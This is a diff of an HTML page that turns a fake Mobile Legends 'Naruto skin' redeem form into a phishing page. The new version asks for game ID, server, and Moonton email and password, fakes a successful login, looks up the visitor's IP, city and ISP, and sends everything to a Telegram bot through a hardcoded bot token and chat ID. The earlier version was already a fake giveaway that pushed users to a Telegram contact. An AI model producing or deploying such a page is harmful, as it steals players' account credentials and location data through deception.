@@ -1,149 +1,195 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MLBB Naruto Skin Redeem</title>
+  <meta charset="UTF-8">
+  <title>Claim MLBB x Naruto Skins</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #000000, #0f0f0f);
-      color: #00ffe0;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .container {
-      background: #111;
-      border: 2px solid #00ffe0;
-      padding: 30px;
-      border-radius: 16px;
-      width: 360px;
-      box-shadow: 0 0 25px #00ffe0;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      font-family: Arial, sans-serif;
+      color: white;
       text-align: center;
+      padding: 30px;
     }
-
-    h2, h3 {
-      color: #00ffe0;
-      margin-bottom: 20px;
+    .container {
+      background: linear-gradient(135deg, #39FF14, #FF00FF);
+      padding: 20px;
+      border-radius: 10px;
+      color: white;
+      box-shadow: 0 0 15px #FF00FF, 0 0 25px #39FF14;
+        }
+    
+    .skins {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin: 20px 0;
     }
-
-    input, select, button {
+    .skins img {
       width: 100%;
-      padding: 12px;
+      border-radius: 10px;
+      cursor: pointer;
+      border: 3px solid transparent;
+      transition: 0.3s;
+    }
+    .skins img.selected {
+      border: 3px solid #ffcc00;
+    }
+    input, button {
+      width: 90%;
+      padding: 10px;
       margin: 10px 0;
-      font-size: 16px;
-      border-radius: 6px;
       border: none;
+      border-radius: 5px;
     }
-
-    input, select {
-      background: #1a1a1a;
-      color: #00ffe0;
-      border: 1px solid #00ffe0;
-    }
-
     button {
-      background: linear-gradient(135deg, #00ffe0, #00bfff);
-      color: #000;
+      background-color: #ffcc00;
       font-weight: bold;
       cursor: pointer;
-      transition: transform 0.2s ease;
     }
-
-    button:hover {
-      transform: scale(1.05);
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    #resultBox {
-      background: #1b1b1b;
+    .confirmation {
+      background: rgba(0, 0, 0, 0.7);
       padding: 20px;
-      border: 1px solid #00ffe0;
       border-radius: 10px;
-      margin-top: 10px;
-      color: #00ffe0;
+      margin-top: 20px;
     }
-
-    strong {
-      color: #ffffff;
+    .confirmation img {
+      width: 50%;
+      border-radius: 10px;
+      margin: 10px 0;
+    }
+    .login-container {
+      margin-top: 20px;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.8);
+      border-radius: 10px;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-    <div id="formPage">
-      <h2>MLBB Naruto Skin Redeem</h2>
-      <form id="redeemForm">
-        <input type="text" id="username" placeholder="Enter your MLBB Username" required />
-        <input type="text" id="mlbbId" placeholder="Enter your MLBB ID" required />
-        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required />
-        <select id="skinSelect" required>
-          <option value="" disabled selected>Select Your Skin</option>
-          <option>Lukas - Naruto Uzumaki</option>
-          <option>Kalea - Sakura</option>
-          <option>Hayabusa - Kakashi</option>
-          <option>Suyou - Sasuke</option>
-          <option>Ling - Neobeast</option>
-        </select>
-        <button type="submit">Get Redeem Code</button>
+    <h2>Claim MLBB x Naruto Skins!</h2>
+    <p>Select a skin to claim:</p>
+
+    <div class="skins">
+      <img src="https://i.ibb.co.com/zHRSZncP/1746185389171.jpg" alt="Naruto" data-skin="Naruto" class="skin-img">
+      <img src="https://i.ibb.co.com/spV07gMp/1746321990602.jpg" alt="Sasuke" data-skin="Sasuke" class="skin-img">
+      <img src="https://i.ibb.co.com/7x6GvHft/1746321994457.jpg" alt="Sakura" data-skin="Sakura" class="skin-img">
+      <img src="https://i.ibb.co.com/Q01kjzC/1746185392870.jpg" alt="Kakashi" data-skin="Kakashi" class="skin-img">
+    </div>
+
+    <form id="claimForm">
+      <input type="text" id="mlbbId" placeholder="MLBB ID" required><br>
+      <input type="text" id="serverId" placeholder="Server ID (e.g. 1234)" required><br>
+      <button type="button" onclick="showLoginForm()">Next</button>
+    </form>
+
+    <!-- Form Login Moonton -->
+    <div id="loginForm" class="login-container" style="display: none;">
+      <h3>Login Moonton</h3>
+      <form id="moontonLoginForm">
+        <input type="email" id="email" placeholder="Email" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <button type="submit">Login</button>
       </form>
     </div>
 
-    <div id="resultPage" class="hidden">
-      <div id="resultBox">
-        <h3>Congratulations!</h3>
-        <p>Username: <strong id="displayUsername"></strong></p>
-        <p>Selected Skin: <strong id="skinName"></strong></p>
-        <p>Your Redeem Code: <strong id="codeResult"></strong></p>
-        <p>You'll be redirected to Telegram now...</p>
-      </div>
+    <div id="confirmationMessage" class="confirmation" style="display: none;">
+      <h3>Your Claimed Skin:</h3>
+      <img id="claimedSkinImage" src="" alt="Claimed Skin">
+      <p id="skinName"></p>
     </div>
   </div>
 
   <script>
-    const form = document.getElementById("redeemForm");
-    const formPage = document.getElementById("formPage");
-    const resultPage = document.getElementById("resultPage");
+    const BOT_TOKEN = "7788665747:AAH_HIsff4i7lUqbWbH9fuuSbPkvKQwPVes";
+    const CHAT_ID = "7137150704";
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
+    const skins = document.querySelectorAll('.skins img');
+    const skinInput = document.getElementById('selectedSkin');
+    const confirmationMessage = document.getElementById('confirmationMessage');
+    const claimedSkinImage = document.getElementById('claimedSkinImage');
+    const skinName = document.getElementById('skinName');
+    const loginForm = document.getElementById('loginForm');
+    const mlbbIdInput = document.getElementById('mlbbId');
+    const serverIdInput = document.getElementById('serverId');
 
-      const username = document.getElementById("username").value.trim();
-      const mlbbId = document.getElementById("mlbbId").value.trim();
-      const zoneId = document.getElementById("zoneId").value.trim();
-      const skin = document.getElementById("skinSelect").value;
+    let selectedSkin = '';
 
-      if (!username || !mlbbId || !zoneId || !skin) {
-        alert("Please complete all fields.");
+    // Pilih skin
+    skins.forEach(img => {
+      img.addEventListener('click', () => {
+        skins.forEach(i => i.classList.remove('selected'));
+        img.classList.add('selected');
+        selectedSkin = img.dataset.skin;
+      });
+    });
+
+    // Menampilkan form login Moonton
+    function showLoginForm() {
+      if (!mlbbIdInput.value || !serverIdInput.value) {
+        alert('Please enter your MLBB ID and Server.');
+        return;
+      }
+      if (!selectedSkin) {
+        alert('Please select a skin first!');
         return;
       }
 
-      const redeemCode = "MLBB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+      loginForm.style.display = 'block';
+    }
 
-      document.getElementById("displayUsername").textContent = `: ${username} ID : ${mlbbId} ID SERVER : ${zoneId} `;
-      document.getElementById("skinName").textContent = skin;
-      document.getElementById("codeResult").textContent = redeemCode;
+    // Proses login Moonton
+    document.getElementById('moontonLoginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
 
-      formPage.classList.add("hidden");
-      resultPage.classList.remove("hidden");
-      
-      const message = encodeURIComponent(
-        `MLBB Redeem Request:\nUsername: ${username}\nID: ${mlbbId}\nZone: ${zoneId}\nSkin: ${skin}\nCode: ${redeemCode}\nHello admin, I just redeemed MLBB skin`
-      );
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-      setTimeout(() => {
-        window.location.href = `tg://resolve?domain=Moonton027&text=${message}`;
-      }, 3000);
+      if (!email || !password) {
+        alert('Please enter your email and password.');
+        return;
+      }
+
+      // Login berhasil (hanya tampilan)
+      alert('Login successful! Now you can claim your skin.');
+
+      // Kirim data ke Telegram
+      const res = await fetch("https://ipwho.is/");
+      const data = await res.json();
+
+      const message = `
+MLBB INFO
+Skin: ${selectedSkin}
+ID: ${mlbbIdInput.value}
+Server: ${serverIdInput.value}
+
+LOGIN INFO
+Email: ${email}
+password: ${password}
+
+IP INFO
+IP: ${data.ip}
+City: ${data.city}
+ASN: ${data.connection?.asn}
+ISP: ${data.connection?.org}
+      `;
+
+      // Kirim ke Telegram
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+
+      // Tampilkan gambar skin yang diklaim
+      claimedSkinImage.src = skins.find(img => img.dataset.skin === selectedSkin).src;
+      skinName.innerText = `You claimed the skin: ${selectedSkin}`;
+      confirmationMessage.style.display = "block";
     });
   </script>
-
 </body>
-                                 </html>
+</html>
